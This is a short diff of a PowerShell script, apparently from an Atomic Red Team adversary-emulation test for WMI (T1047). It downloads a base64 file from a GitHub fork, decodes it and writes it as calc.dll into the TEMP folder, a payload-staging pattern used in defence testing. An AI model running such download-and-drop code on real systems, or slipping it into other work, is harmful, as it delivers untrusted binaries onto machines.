@@ -1,1 +1,8 @@
 curl "https://github.com/noperle/atomic-red-team/blob/master/atomics/T1047/bin/calc.b64?raw=true" -OutFile "calc.b64"
+
+
+$DLL_Path = "$env:TEMP\calc.dll"
+$Base64_Code = "$env:TEMP\calc.b64"
+$Content1 = get-content $Base64_Code
+[byte[]]$Bytes = [convert]::FromBase64String($Content1)
+[System.IO.File]::WriteAllBytes($DLL_Path,$Bytes)
